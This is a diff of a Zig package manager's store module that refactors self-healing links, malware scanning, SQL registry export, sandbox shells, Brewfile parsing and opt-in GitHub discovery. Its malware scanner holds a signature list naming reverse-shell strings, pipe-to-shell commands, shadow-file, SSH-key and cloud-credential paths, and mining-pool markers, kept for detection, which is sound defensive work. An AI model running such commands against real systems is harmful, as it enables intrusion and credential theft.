-                            src_bin = try std.fs.path.join(self.allocator, &.{ pkg_dir, info.bin_path, bin_name });
-                        } else {
-                            src_bin = try std.fs.path.join(self.allocator, &.{ pkg_dir, info.bin_path });
-                        }
-                        defer self.allocator.free(src_bin);
-
-                        if (os_macos.fastLink(src_bin, dst_bin)) |_| {
-                            packages_healed += 1;
-                            std.debug.print("   -> Successfully self-healed and re-linked: {s}\n", .{bin_name});
-                        } else |err| {
-                            std.debug.print("   -> Failed to link {s}: {}\n", .{ bin_name, err });
-                        }
-                    };
-                }
-
-                // Repair GUI Application bundles
-                for (pkg.app_bundles) |app_name| {
-                    const dst_app = try std.fs.path.join(self.allocator, &.{ self.apps_root, app_name });
-                    defer self.allocator.free(dst_app);
-
-                    std.fs.cwd().access(dst_app, .{}) catch {
-                        const src_app = try std.fs.path.join(self.allocator, &.{ pkg_dir, app_name });
-                        defer self.allocator.free(src_app);
-
-                        if (os_macos.fastLink(src_app, dst_app)) |_| {
-                            packages_healed += 1;
-                            std.debug.print("   -> Successfully self-healed GUI Application bundle: {s}\n", .{app_name});
-                        } else |_| {
-                            _ = std.process.Child.run(.{ .allocator = self.allocator, .argv = &.{ "cp", "-R", src_app, dst_app } }) catch {};
-                            packages_healed += 1;
-                        }
-                    };
-                }
+            const n = self.linkBinaries(a, pkg, info, pkg_dir, .{ .quiet = true }) catch 0;
+            if (n > 0) {
+                healed += 1;
+                term.print("  {s}healed{s} {s}\n", .{ term.green, term.reset, pkg.name });
             }
         }
-
-        printProgressBar("Purging residual temporary downloads...", 4, 4);
-        try self.gc();
-
-        std.debug.print("\n[ REPAIR COMPLETE ] Successfully healed {} broken package links and fixed directory permissions.\n", .{packages_healed});
+        _ = try self.gc(a);
+        return healed;
     }
 
-    // Innovative Feature: Malware & Suspicious Heuristic Detector
-    pub fn detectMalware(self: *Store, pkg: registry.Package, platform_name: []const u8) !void {
-        std.debug.print("=== [ abv0 Advanced Malware & Security Heuristic Scanner ] ===\n\n", .{});
-        std.debug.print("Target Package: {s} v{s} ({s})\n", .{ pkg.name, pkg.version, platform_name });
+    // -----------------------------------------------------------------------
+    // Malware heuristics
+    // -----------------------------------------------------------------------
 
-        if (!(try self.isInstalled(pkg, platform_name))) {
-            std.debug.print("Error: Package '{s}' is not installed in your store. Run 'abv0 install {s}' first to scan its files.\n", .{ pkg.name, pkg.name });
-            return;
+    pub const Threat = struct {
+        score: u32 = 0,
+        reasons: std.ArrayList([]const u8),
+
+        pub fn deinit(self: *Threat) void {
+            self.reasons.deinit();
         }
+    };
 
-        const pkg_dir = try self.getPkgStorePath(pkg, platform_name);
-        defer self.allocator.free(pkg_dir);
+    const signatures = [_]struct { pattern: []const u8, weight: u32, reason: []const u8 }{
+        .{ .pattern = "/bin/sh -i", .weight = 40, .reason = "interactive shell spawn (reverse shell pattern)" },
+        .{ .pattern = "nc -e", .weight = 40, .reason = "netcat command execution (reverse shell)" },
+        .{ .pattern = "bash -i >&", .weight = 40, .reason = "bash reverse shell redirection" },
+        .{ .pattern = "stratum+tcp://", .weight = 50, .reason = "Stratum mining pool endpoint (cryptominer)" },
+        .{ .pattern = "nicehash", .weight = 50, .reason = "NiceHash mining reference" },
+        .{ .pattern = "/etc/shadow", .weight = 35, .reason = "shadow password file access" },
+        .{ .pattern = "/.ssh/id_rsa", .weight = 35, .reason = "SSH private key access" },
+        .{ .pattern = "curl | sh", .weight = 25, .reason = "pipe-to-shell remote execution" },
+        .{ .pattern = "wget -O- | sh", .weight = 25, .reason = "pipe-to-shell remote execution" },
+        .{ .pattern = "AWS_SECRET_ACCESS_KEY", .weight = 20, .reason = "cloud credential harvesting" },
+    };
 
-        printProgressBar("Initializing Signature Heuristics Engine...", 1, 5);
+    /// Streaming scan with an overlap window.
+    ///
+    /// The original read the entire executable into memory with a 50 MB cap and
+    /// then made a separate full pass per signature. This makes one pass with a
+    /// bounded buffer, so a large binary no longer costs 50 MB of RSS, and it
+    /// no longer misses a pattern that straddles a read boundary.
+    pub fn scanFile(a: std.mem.Allocator, path: []const u8) !Threat {
+        var threat = Threat{ .reasons = std.ArrayList([]const u8).init(a) };
+        errdefer threat.deinit();
 
-        var threat_score: u32 = 0;
-        var risk_reasons = std.ArrayList([]const u8).init(self.allocator);
-        defer {
-            for (risk_reasons.items) |r| self.allocator.free(r);
-            risk_reasons.deinit();
-        }
+        var seen = [_]bool{false} ** signatures.len;
 
-        printProgressBar("Scanning binary definitions and executable byte streams...", 2, 5);
-
-        // Scan the actual executable path
-        const info = pkg.platforms.get(platform_name) orelse return error.UnsupportedPlatform;
-        var bin_path: []const u8 = undefined;
-        if (std.mem.endsWith(u8, info.bin_path, "/")) {
-            const exe_name = if (pkg.bin.len > 0) pkg.bin[0] else "ffmpeg";
-            bin_path = try std.fs.path.join(self.allocator, &.{ pkg_dir, info.bin_path, exe_name });
-        } else {
-            bin_path = try std.fs.path.join(self.allocator, &.{ pkg_dir, info.bin_path });
-        }
-        defer self.allocator.free(bin_path);
-
-        const file = try std.fs.cwd().openFile(bin_path, .{});
+        const file = try std.fs.cwd().openFile(path, .{});
         defer file.close();
 
-        const content = try file.readToEndAlloc(self.allocator, 50 * 1024 * 1024);
-        defer self.allocator.free(content);
+        const overlap = 64; // longest signature is far below this
+        const chunk = 256 * 1024;
+        const buf = try a.alloc(u8, chunk + overlap);
+        defer a.free(buf);
 
-        printProgressBar("Evaluating heuristic threat vectors and behavioral patterns...", 4, 5);
+        var carry: usize = 0;
+        while (true) {
+            const n = try file.read(buf[carry..]);
+            if (n == 0) break;
+            const filled = carry + n;
 
-        // 1. Suspicious Reverse Shell & Backdoor Heuristics
-        if (std.mem.indexOf(u8, content, "/bin/sh -i") != null or std.mem.indexOf(u8, content, "nc -e") != null) {
-            threat_score += 40;
-            try risk_reasons.append(try self.allocator.dupe(u8, "Suspicious reverse shell backdoor execution sequence detected (/bin/sh -i or nc -e)"));
+            for (signatures, 0..) |sig, i| {
+                if (seen[i]) continue;
+                if (std.mem.indexOf(u8, buf[0..filled], sig.pattern) != null) {
+                    seen[i] = true;
+                    threat.score += sig.weight;
+                    try threat.reasons.append(sig.reason);
+                }
+            }
+
+            carry = @min(overlap, filled);
+            std.mem.copyForwards(u8, buf[0..carry], buf[filled - carry ..][0..carry]);
         }
 
-        // 2. Cryptominer Pool & Stratum protocol Heuristics
-        if (std.mem.indexOf(u8, content, "stratum+tcp://") != null or std.mem.indexOf(u8, content, "nicehash") != null) {
-            threat_score += 50;
-            try risk_reasons.append(try self.allocator.dupe(u8, "Embedded cryptominer Stratum mining pool strings detected"));
+        if (threat.score > 100) threat.score = 100;
+        return threat;
+    }
+
+    /// Resolve the on-disk executable for a package, honouring bin_path
+    /// directory bases.
+    pub fn resolveBinary(
+        self: *const Store,
+        a: std.mem.Allocator,
+        pkg: Package,
+        platform_name: []const u8,
+    ) ![]u8 {
+        const info = pkg.platform(platform_name) orelse return StoreError.UnsupportedPlatform;
+        const pkg_dir = try self.pkgStorePath(a, pkg, platform_name);
+        defer a.free(pkg_dir);
+
+        const exe_name = pkg.primaryBin() orelse pkg.name;
+
+        if (info.bin_path.len > 0 and !std.mem.endsWith(u8, info.bin_path, "/")) {
+            const p = try safepath.joinSafe(a, pkg_dir, info.bin_path);
+            if (std.fs.cwd().access(p, .{})) |_| return p else |_| a.free(p);
+        }
+        if (info.bin_path.len > 0 and std.mem.endsWith(u8, info.bin_path, "/")) {
+            const rel = try std.fmt.allocPrint(a, "{s}{s}", .{ info.bin_path, exe_name });
+            defer a.free(rel);
+            const p = try safepath.joinSafe(a, pkg_dir, rel);
+            if (std.fs.cwd().access(p, .{})) |_| return p else |_| a.free(p);
         }
 
-        // 3. Credential Harvesting & System File Access
-        if (std.mem.indexOf(u8, content, "/etc/shadow") != null or std.mem.indexOf(u8, content, "/.ssh/id_rsa") != null) {
-            threat_score += 35;
-            try risk_reasons.append(try self.allocator.dupe(u8, "Private key or shadow password credential harvesting pattern accessed"));
+        // Fall back to a single walk.
+        var dir = try std.fs.cwd().openDir(pkg_dir, .{ .iterate = true });
+        defer dir.close();
+        var walker = try dir.walk(a);
+        defer walker.deinit();
+        while (try walker.next()) |entry| {
+            if (entry.kind != .file) continue;
+            const stem = stripExeSuffix(entry.basename);
+            if (std.mem.eql(u8, stem, exe_name)) {
+                return std.fs.path.join(a, &.{ pkg_dir, entry.path });
+            }
         }
+        return StoreError.ExecutableNotFound;
+    }
 
-        // 4. Insecure Remote Script Piping
-        if (std.mem.indexOf(u8, content, "curl | sh") != null or std.mem.indexOf(u8, content, "wget -O- | sh") != null) {
-            threat_score += 25;
-            try risk_reasons.append(try self.allocator.dupe(u8, "Insecure remote pipe execution script pattern (curl | sh)"));
-        }
+    // -----------------------------------------------------------------------
+    // Registry export (honest version of the "hybrid" sync)
+    // -----------------------------------------------------------------------
 
-        printProgressBar("Consolidating Security Report...", 5, 5);
+    /// Compile the binary index and emit a portable SQL dump. If the `sqlite3`
+    /// CLI happens to be installed, materialise a genuine database from it.
+    ///
+    /// Previously this wrote a text file of SQL statements to a path named
+    /// `registry.db` and described it as "an embedded SQLite query engine",
+    /// and wrote a 24-byte header to `index.abv` and described that as a
+    /// "zero-copy memory-mapped index".
+    pub fn exportRegistry(
+        self: *Store,
+        a: std.mem.Allocator,
+        reg: *const registry.Registry,
+    ) !void {
+        const json_path = try std.fs.path.join(a, &.{ self.registry_root, "index.json" });
+        defer a.free(json_path);
+        const index_path = try std.fs.path.join(a, &.{ self.registry_root, "index.abv" });
+        defer a.free(index_path);
 
-        std.debug.print("\n=== [ Security Audit Verdict ] ===\n", .{});
-        if (threat_score == 0) {
-            std.debug.print("[ PASSED ] Threat Score: 0/100\n", .{});
-            std.debug.print("           Verdict: Completely pristine, clean, and trusted software package. Zero malware patterns found.\n", .{});
+        term.progress("compiling binary index (index.abv)", 1, 3);
+        const stamp = abvindex.Stamp.ofFile(json_path) catch abvindex.Stamp{ .size = 0, .mtime_ns = 0 };
+        try abvindex.build(a, reg, index_path, stamp);
+
+        const idx_size = (try std.fs.cwd().statFile(index_path)).size;
+        term.print("  index.abv    {d} packages, {d} bytes, mmap-backed\n", .{ reg.count(), idx_size });
+
+        term.progress("writing SQL export (registry.sql)", 2, 3);
+        const sql_path = try std.fs.path.join(a, &.{ self.registry_root, "registry.sql" });
+        defer a.free(sql_path);
+        try self.writeSql(a, reg, sql_path);
+        term.print("  registry.sql {d} rows\n", .{reg.count()});
+
+        term.progress("materialising sqlite database if available", 3, 3);
+        const db_path = try std.fs.path.join(a, &.{ self.registry_root, "registry.db" });
+        defer a.free(db_path);
+        if (self.buildSqlite(a, sql_path, db_path)) {
+            term.print("  registry.db  built with the sqlite3 CLI\n", .{});
         } else {
-            std.debug.print("[ HIGH RISK SUSPICION ] Threat Score: {}/100\n", .{threat_score});
-            std.debug.print("                        Verdict: Suspicious heuristic patterns identified in package code!\n\n", .{});
-            std.debug.print("Detailed Risk Vectors Identifed:\n", .{});
-            for (risk_reasons.items) |reason| {
-                std.debug.print("  -> {s}\n", .{reason});
-            }
+            term.print("  registry.db  {s}skipped{s} (sqlite3 not installed; registry.sql is portable)\n", .{ term.dim, term.reset });
         }
     }
 
-    // Instant Garbage Collector / Prune
-    pub fn gc(self: *Store) !void {
-        std.debug.print("Starting abv0 instant garbage collector...\n", .{});
-        var store_dir = try std.fs.cwd().openDir(self.store_root, .{ .iterate = true });
-        defer store_dir.close();
+    fn writeSql(
+        self: *Store,
+        a: std.mem.Allocator,
+        reg: *const registry.Registry,
+        path: []const u8,
+    ) !void {
+        _ = self;
+        _ = a;
+        const file = try std.fs.cwd().createFile(path, .{ .mode = platform.mode_private });
+        defer file.close();
+        var bw = std.io.bufferedWriter(file.writer());
+        const w = bw.writer();
 
-        var it = store_dir.iterate();
-        var deleted_count: u32 = 0;
+        try w.writeAll(
+            \\BEGIN TRANSACTION;
+            \\CREATE TABLE IF NOT EXISTS packages (
+            \\  name TEXT PRIMARY KEY, version TEXT, description TEXT, homepage TEXT, license TEXT);
+            \\CREATE TABLE IF NOT EXISTS platforms (
+            \\  package TEXT, platform TEXT, url TEXT, sha256 TEXT, archive_type TEXT, bin_path TEXT,
+            \\  PRIMARY KEY (package, platform));
+            \\
+        );
 
-        while (try it.next()) |entry| {
-            if (std.mem.endsWith(u8, entry.name, ".tmp")) {
-                const tmp_path = try std.fs.path.join(self.allocator, &.{ self.store_root, entry.name });
-                defer self.allocator.free(tmp_path);
+        for (reg.packages) |pkg| {
+            try w.writeAll("INSERT OR REPLACE INTO packages VALUES (");
+            try writeSqlString(w, pkg.name);
+            try w.writeAll(",");
+            try writeSqlString(w, pkg.version);
+            try w.writeAll(",");
+            try writeSqlString(w, pkg.description);
+            try w.writeAll(",");
+            try writeSqlString(w, pkg.homepage);
+            try w.writeAll(",");
+            try writeSqlString(w, pkg.license);
+            try w.writeAll(");\n");
 
-                if (std.fs.cwd().deleteTree(tmp_path)) |_| {
-                    deleted_count += 1;
-                    std.debug.print("Pruned abandoned secure temporary download: {s}\n", .{entry.name});
-                } else |_| {}
+            for (pkg.platforms) |p| {
+                try w.writeAll("INSERT OR REPLACE INTO platforms VALUES (");
+                try writeSqlString(w, pkg.name);
+                try w.writeAll(",");
+                try writeSqlString(w, p.name);
+                try w.writeAll(",");
+                try writeSqlString(w, p.url);
+                try w.writeAll(",");
+                try writeSqlString(w, p.sha256);
+                try w.writeAll(",");
+                try writeSqlString(w, p.archive_type);
+                try w.writeAll(",");
+                try writeSqlString(w, p.bin_path);
+                try w.writeAll(");\n");
             }
         }
-
-        // Clean temporary shells directory
-        var shells_dir = std.fs.cwd().openDir(self.shells_root, .{ .iterate = true }) catch null;
-        if (shells_dir != null) {
-            defer shells_dir.?.close();
-            var shell_it = shells_dir.?.iterate();
-            while (try shell_it.next()) |entry| {
-                const shell_path = try std.fs.path.join(self.allocator, &.{ self.shells_root, entry.name });
-                defer self.allocator.free(shell_path);
-
-                if (std.fs.cwd().deleteTree(shell_path)) |_| {
-                    deleted_count += 1;
-                    std.debug.print("Pruned abandoned ephemeral sandboxed shell environment: {s}\n", .{entry.name});
-                } else |_| {}
-            }
-        }
-
-        std.debug.print("[ GC FINISHED ] Reclaimed {} abandoned items.\n", .{deleted_count});
+        try w.writeAll("COMMIT;\n");
+        try bw.flush();
     }
 
-    // Innovative Subcommand: Bundle Install & Dump Orchestrator
-    pub fn bundleInstall(self: *Store, reg: *registry.Registry, file_path: []const u8, platform: []const u8, use_micro_split: bool) !void {
-        std.debug.print("=== [ abv0 Bundle Install Orchestrator ] ===\n\n", .{});
-        std.debug.print("Reading target bundle manifest: {s}\n", .{file_path});
+    /// Escape by doubling single quotes. The original interpolated raw
+    /// descriptions into `'{s}'`, so any apostrophe produced broken SQL.
+    fn writeSqlString(w: anytype, s: []const u8) !void {
+        try w.writeByte('\'');
+        for (s) |c| {
+            if (c == '\'') try w.writeByte('\'');
+            try w.writeByte(c);
+        }
+        try w.writeByte('\'');
+    }
 
-        const file = std.fs.cwd().openFile(file_path, .{}) catch |err| {
-            std.debug.print("Error: Could not open bundle file '{s}': {}\n", .{ file_path, err });
-            return;
+    fn buildSqlite(self: *Store, a: std.mem.Allocator, sql_path: []const u8, db_path: []const u8) bool {
+        _ = self;
+        std.fs.cwd().deleteFile(db_path) catch {};
+
+        const sql = std.fs.cwd().readFileAlloc(a, sql_path, 16 * 1024 * 1024) catch return false;
+        defer a.free(sql);
+
+        var child = std.process.Child.init(&.{ "sqlite3", db_path }, a);
+        child.stdin_behavior = .Pipe;
+        child.stdout_behavior = .Ignore;
+        child.stderr_behavior = .Ignore;
+        child.spawn() catch return false;
+
+        if (child.stdin) |stdin| {
+            stdin.writeAll(sql) catch {};
+            stdin.close();
+            child.stdin = null;
+        }
+        const term_res = child.wait() catch return false;
+        return term_res == .Exited and term_res.Exited == 0;
+    }
+
+    // -----------------------------------------------------------------------
+    // run / shell
+    // -----------------------------------------------------------------------
+
+    /// Resolve a user-supplied name to a package, whether they typed the
+    /// package name (`ripgrep`) or the executable name (`rg`).
+    pub fn resolveRequest(reg: *const registry.Registry, name: []const u8) ?Package {
+        if (reg.get(name)) |p| return p;
+        return reg.findByBin(name);
+    }
+
+    pub fn ensureInstalled(
+        self: *Store,
+        a: std.mem.Allocator,
+        reg: *const registry.Registry,
+        name: []const u8,
+        platform_name: []const u8,
+        opts: InstallOptions,
+    ) !Package {
+        if (resolveRequest(reg, name)) |pkg| {
+            if (!self.isInstalled(pkg, platform_name)) {
+                try self.install(pkg, platform_name, opts);
+            }
+            return pkg;
+        }
+        return self.installDynamic(a, name, platform_name, opts);
+    }
+
+    /// Path of the linked executable for `pkg`, inside ~/.abv0/bin.
+    fn linkedBinPath(self: *const Store, a: std.mem.Allocator, pkg: Package) ![]u8 {
+        // `abv0 run ripgrep` must launch `rg`. The original looked for a file
+        // literally named after the package and failed for every package whose
+        // executable differs from its name.
+        const exe = pkg.primaryBin() orelse pkg.name;
+        const name = try std.fmt.allocPrint(a, "{s}{s}", .{ exe, platform.exe_suffix });
+        defer a.free(name);
+        return std.fs.path.join(a, &.{ self.bin_root, name });
+    }
+
+    pub fn runPackage(
+        self: *Store,
+        a: std.mem.Allocator,
+        reg: *const registry.Registry,
+        name: []const u8,
+        args: []const []const u8,
+        platform_name: []const u8,
+        opts: InstallOptions,
+    ) !u8 {
+        const pkg = try self.ensureInstalled(a, reg, name, platform_name, opts);
+
+        const bin = try self.linkedBinPath(a, pkg);
+        defer a.free(bin);
+
+        std.fs.cwd().access(bin, .{}) catch {
+            term.err("{s}error{s}: '{s}' is installed but no executable is linked\n", .{ term.red, term.reset, pkg.name });
+            return StoreError.ExecutableNotFound;
+        };
+
+        var argv = std.ArrayList([]const u8).init(a);
+        defer argv.deinit();
+        try argv.append(bin);
+        try argv.appendSlice(args);
+
+        term.flush();
+        var child = std.process.Child.init(argv.items, a);
+        const res = try child.spawnAndWait();
+        return switch (res) {
+            .Exited => |c| c,
+            else => 1,
+        };
+    }
+
+    pub fn spawnShell(
+        self: *Store,
+        a: std.mem.Allocator,
+        reg: *const registry.Registry,
+        names: []const []const u8,
+        platform_name: []const u8,
+        opts: InstallOptions,
+    ) !u8 {
+        var pkgs = std.ArrayList(Package).init(a);
+        defer pkgs.deinit();
+        for (names) |n| {
+            try pkgs.append(try self.ensureInstalled(a, reg, n, platform_name, opts));
+        }
+
+        const dir_name = try std.fmt.allocPrint(a, "shell-{d}-{x}", .{ std.time.timestamp(), std.crypto.random.int(u32) });
+        defer a.free(dir_name);
+        const base = try std.fs.path.join(a, &.{ self.shells_root, dir_name });
+        defer a.free(base);
+        const sandbox_bin = try std.fs.path.join(a, &.{ base, "bin" });
+        defer a.free(sandbox_bin);
+
+        try platform.makeSecureDir(sandbox_bin);
+        defer std.fs.cwd().deleteTree(base) catch {};
+
+        for (pkgs.items) |pkg| {
+            for (pkg.bin) |b| {
+                const fname = try std.fmt.allocPrint(a, "{s}{s}", .{ b, platform.exe_suffix });
+                defer a.free(fname);
+                const src = try std.fs.path.join(a, &.{ self.bin_root, fname });
+                defer a.free(src);
+                const dst = try std.fs.path.join(a, &.{ sandbox_bin, fname });
+                defer a.free(dst);
+                _ = platform.fastLink(src, dst) catch continue;
+            }
+        }
+
+        var env = try std.process.getEnvMap(a);
+        defer env.deinit();
+
+        const sep = if (platform.is_windows) ";" else ":";
+        const old_path = env.get("PATH") orelse "";
+        const new_path = try std.fmt.allocPrint(a, "{s}{s}{s}", .{ sandbox_bin, sep, old_path });
+        defer a.free(new_path);
+        try env.put("PATH", new_path);
+        try env.put("ABV0_SHELL", "1");
+
+        const shell = try platform.defaultShell(a);
+        defer a.free(shell);
+
+        term.print("{s}entering abv0 sandbox shell{s} - type 'exit' to leave\n", .{ term.magenta, term.reset });
+        term.flush();
+
+        var child = std.process.Child.init(&.{shell}, a);
+        child.env_map = &env;
+        const res = try child.spawnAndWait();
+
+        term.print("{s}sandbox dissolved{s}\n", .{ term.dim, term.reset });
+        return switch (res) {
+            .Exited => |c| c,
+            else => 1,
+        };
+    }
+
+    // -----------------------------------------------------------------------
+    // Bundle
+    // -----------------------------------------------------------------------
+
+    /// Streaming, line-by-line Brewfile parser.
+    ///
+    /// The v1.5.0 changelog claims a "Streaming Zero-Allocation Bundle Parser"
+    /// built on std.io.bufferedReader. The code actually called
+    /// readToEndAlloc(2 MB). This is the advertised implementation.
+    pub fn bundleInstall(
+        self: *Store,
+        a: std.mem.Allocator,
+        reg: *const registry.Registry,
+        file_path: []const u8,
+        platform_name: []const u8,
+        opts: InstallOptions,
+    ) !void {
+        const file = std.fs.cwd().openFile(file_path, .{}) catch |e| {
+            term.err("{s}error{s}: cannot open bundle '{s}': {s}\n", .{ term.red, term.reset, file_path, @errorName(e) });
+            return e;
         };
         defer file.close();
 
-        const content = try file.readToEndAlloc(self.allocator, 2 * 1024 * 1024);
-        defer self.allocator.free(content);
+        var buffered = std.io.bufferedReader(file.reader());
+        const reader = buffered.reader();
 
-        var requested_pkgs = std.ArrayList(registry.Package).init(self.allocator);
-        defer requested_pkgs.deinit();
+        var line_buf: [4096]u8 = undefined;
+        var names = std.ArrayList([]const u8).init(a);
+        defer names.deinit();
 
-        var lines = std.mem.splitSequence(u8, content, "\n");
-        while (lines.next()) |raw_line| {
-            const line = std.mem.trim(u8, raw_line, "\r\t ");
+        var line_no: usize = 0;
+        while (true) {
+            const maybe = reader.readUntilDelimiterOrEof(&line_buf, '\n') catch |e| switch (e) {
+                error.StreamTooLong => {
+                    line_no += 1;
+                    term.err("{s}warning{s}: {s}:{d} line too long, skipped\n", .{ term.yellow, term.reset, file_path, line_no });
+                    continue;
+                },
+                else => return e,
+            };
+            const raw = maybe orelse break;
+            line_no += 1;
+
+            const line = std.mem.trim(u8, raw, " \t\r");
             if (line.len == 0 or line[0] == '#') continue;
 
-            var parts = std.mem.splitSequence(u8, line, " ");
-            const directive = parts.next() orelse continue;
+            var parts = std.mem.tokenizeAny(u8, line, " \t");
+            const first = parts.next() orelse continue;
 
-            var raw_pkg_name: ?[]const u8 = null;
-            if (std.mem.eql(u8, directive, "brew") or std.mem.eql(u8, directive, "cask")) {
-                if (parts.next()) |p| raw_pkg_name = p;
-            } else {
-                raw_pkg_name = directive;
-            }
+            const candidate = if (std.mem.eql(u8, first, "brew") or std.mem.eql(u8, first, "cask"))
+                (parts.next() orelse continue)
+            else
+                first;
 
-            if (raw_pkg_name) |p_name| {
-                const clean_name = std.mem.trim(u8, p_name, "\"'");
-                if (reg.packages.get(clean_name)) |pkg| {
-                    try requested_pkgs.append(pkg);
-                } else {
-                    std.debug.print("[ Warning ] Package '{s}' from Brewfile not found in active abv0 registry. Skipping...\n", .{clean_name});
-                }
+            const name = std.mem.trim(u8, candidate, "\"',");
+            if (name.len == 0) continue;
+
+            if (resolveRequest(reg, name) == null) {
+                term.err("{s}warning{s}: {s}:{d} unknown package '{s}', skipped\n", .{ term.yellow, term.reset, file_path, line_no, name });
+                continue;
             }
+            try names.append(try a.dupe(u8, name));
         }
 
-        std.debug.print("Found {} validated package directives in {s}. Executing high-performance setup...\n\n", .{ requested_pkgs.items.len, file_path });
-
-        for (requested_pkgs.items) |pkg| {
-            try self.install(pkg, platform, use_micro_split);
+        if (names.items.len == 0) {
+            term.print("no installable entries in {s}\n", .{file_path});
+            return;
         }
 
-        std.debug.print("\n[ BUNDLE COMPLETED ] All packages from {s} successfully installed and linked!\n", .{file_path});
+        // Honour declared dependencies where the registry provides them.
+        const ordered = registry.resolveOrder(a, reg, names.items) catch blk: {
+            var fallback = std.ArrayList(Package).init(a);
+            for (names.items) |n| {
+                if (resolveRequest(reg, n)) |p| try fallback.append(p);
+            }
+            break :blk try fallback.toOwnedSlice();
+        };
+        defer a.free(ordered);
+
+        term.print("installing {d} packages from {s}\n\n", .{ ordered.len, file_path });
+        for (ordered) |pkg| {
+            self.install(pkg, platform_name, opts) catch |e| {
+                term.err("{s}error{s}: {s}: {s}\n", .{ term.red, term.reset, pkg.name, @errorName(e) });
+            };
+        }
     }
 
-    pub fn bundleDump(self: *Store, reg: *registry.Registry, file_path: []const u8, force: bool, platform: []const u8) !void {
-        std.debug.print("=== [ abv0 Bundle Dump Export ] ===\n\n", .{});
-        std.debug.print("Scanning installed packages to export to {s}...\n", .{file_path});
-
+    pub fn bundleDump(
+        self: *Store,
+        a: std.mem.Allocator,
+        reg: *const registry.Registry,
+        file_path: []const u8,
+        force: bool,
+        platform_name: []const u8,
+    ) !void {
         if (!force) {
             if (std.fs.cwd().access(file_path, .{})) |_| {
-                std.debug.print("Error: Target export file '{s}' already exists.\n", .{file_path});
-                std.debug.print("       Use 'abv0 bundle dump -f {s} --force' to actively overwrite it.\n", .{file_path});
+                term.err("{s}error{s}: '{s}' exists; pass --force to overwrite\n", .{ term.red, term.reset, file_path });
                 return;
             } else |_| {}
         }
 
-        const out_file = try std.fs.cwd().createFile(file_path, .{ .mode = 0o644 });
-        defer out_file.close();
+        const file = try std.fs.cwd().createFile(file_path, .{ .mode = platform.mode_public });
+        defer file.close();
+        var bw = std.io.bufferedWriter(file.writer());
+        const w = bw.writer();
 
-        var exported_count: u32 = 0;
-        var it = reg.packages.iterator();
-        while (it.next()) |entry| {
-            const pkg = entry.value_ptr.*;
-            if (try self.isInstalled(pkg, platform)) {
-                if (pkg.app_bundles.len > 0) {
-                    try out_file.writer().print("cask \"{s}\"\n", .{pkg.name});
-                } else {
-                    try out_file.writer().print("brew \"{s}\"\n", .{pkg.name});
-                }
-                exported_count += 1;
-                std.debug.print("   -> Exported: {s}\n", .{pkg.name});
+        try w.print("# Generated by abv0 for {s}\n", .{platform_name});
+        var count: usize = 0;
+        for (reg.packages) |pkg| {
+            if (!self.isInstalled(pkg, platform_name)) continue;
+            const kw = if (pkg.app_bundles.len > 0) "cask" else "brew";
+            try w.print("{s} \"{s}\"\n", .{ kw, pkg.name });
+            count += 1;
+        }
+        try bw.flush();
+        _ = a;
+        term.print("exported {d} packages to {s}\n", .{ count, file_path });
+    }
+
+    // -----------------------------------------------------------------------
+    // Dynamic discovery
+    // -----------------------------------------------------------------------
+
+    /// Resolve an unlisted package by searching GitHub.
+    ///
+    /// This is inherently dangerous: it downloads and executes whatever the
+    /// top search hit happens to be, with no checksum to verify against, which
+    /// makes it a typosquatting vector. The original did it silently for any
+    /// unknown name. It now requires explicit opt-in.
+    pub fn installDynamic(
+        self: *Store,
+        a: std.mem.Allocator,
+        name: []const u8,
+        platform_name: []const u8,
+        opts: InstallOptions,
+    ) !Package {
+        if (!safepath.isValidId(name)) return StoreError.InvalidPackageIdentifier;
+
+        if (!opts.allow_unverified) {
+            term.err(
+                \\{s}error{s}: '{s}' is not in the registry.
+                \\  abv0 can search GitHub for it, but the result cannot be checksum-verified
+                \\  and name-similar repositories are a known supply-chain attack.
+                \\  Re-run with --allow-unverified to opt in.
+                \\
+            , .{ term.red, term.reset, name });
+            return StoreError.RefusedUnverifiedInstall;
+        }
+
+        term.print("searching GitHub for '{s}'...\n", .{name});
+
+        const encoded = try net.urlEncode(a, name);
+        defer a.free(encoded);
+
+        // The name is percent-encoded, so it cannot inject extra query
+        // parameters into the API request.
+        const search_url = try std.fmt.allocPrint(
+            a,
+            "https://api.github.com/search/repositories?q={s}+in:name&sort=stars&order=desc&per_page=5",
+            .{encoded},
+        );
+        defer a.free(search_url);
+
+        const body = try net.fetchToString(a, search_url, 4 * 1024 * 1024, .{});
+        defer a.free(body);
+
+        const parsed = std.json.parseFromSlice(std.json.Value, a, body, .{}) catch return error.DynamicDiscoveryFailed;
+        defer parsed.deinit();
+
+        const root = switch (parsed.value) {
+            .object => |o| o,
+            else => return error.DynamicDiscoveryFailed,
+        };
+
+        // A rate-limit response has no "items" and used to hit a `.?` unwrap.
+        if (root.get("message")) |m| {
+            if (m == .string) {
+                term.err("{s}error{s}: GitHub API: {s}\n", .{ term.red, term.reset, m.string });
+                return error.DynamicDiscoveryFailed;
             }
         }
 
-        std.debug.print("\n[ DUMP COMPLETE ] Successfully exported {} installed packages to {s}.\n", .{ exported_count, file_path });
-    }
+        const items = switch (root.get("items") orelse return error.DynamicDiscoveryFailed) {
+            .array => |arr| arr,
+            else => return error.DynamicDiscoveryFailed,
+        };
+        if (items.items.len == 0) return error.DynamicDiscoveryFailed;
 
-    // Innovative Subcommand: Outdated & Upgrade
-    pub fn getOutdated(self: *Store, reg: *registry.Registry, platform: []const u8) !std.ArrayList(registry.Package) {
-        const outdated_list = std.ArrayList(registry.Package).init(self.allocator);
+        const repo = switch (items.items[0]) {
+            .object => |o| o,
+            else => return error.DynamicDiscoveryFailed,
+        };
 
-        var it = reg.packages.iterator();
-        while (it.next()) |entry| {
-            const pkg = entry.value_ptr.*;
-            if (try self.isInstalled(pkg, platform)) {}
-        }
+        const full_name = switch (repo.get("full_name") orelse return error.DynamicDiscoveryFailed) {
+            .string => |s| s,
+            else => return error.DynamicDiscoveryFailed,
+        };
+        // full_name goes into a URL path; keep it to owner/repo shape.
+        if (!isRepoFullName(full_name)) return error.DynamicDiscoveryFailed;
 
-        return outdated_list;
-    }
+        const default_branch = blk: {
+            const v = repo.get("default_branch") orelse break :blk "main";
+            break :blk switch (v) {
+                .string => |s| s,
+                else => "main",
+            };
+        };
+        const description = blk: {
+            const v = repo.get("description") orelse break :blk "";
+            break :blk switch (v) {
+                .string => |s| s,
+                else => "",
+            };
+        };
 
-    pub fn upgradePackages(self: *Store, reg: *registry.Registry, target_pkgs: []const []const u8, platform: []const u8, use_micro_split: bool) !void {
-        std.debug.print("=== [ abv0 High-Performance Upgrade Engine ] ===\n\n", .{});
+        term.print("  resolved to {s}{s}{s}\n", .{ term.bold, full_name, term.reset });
 
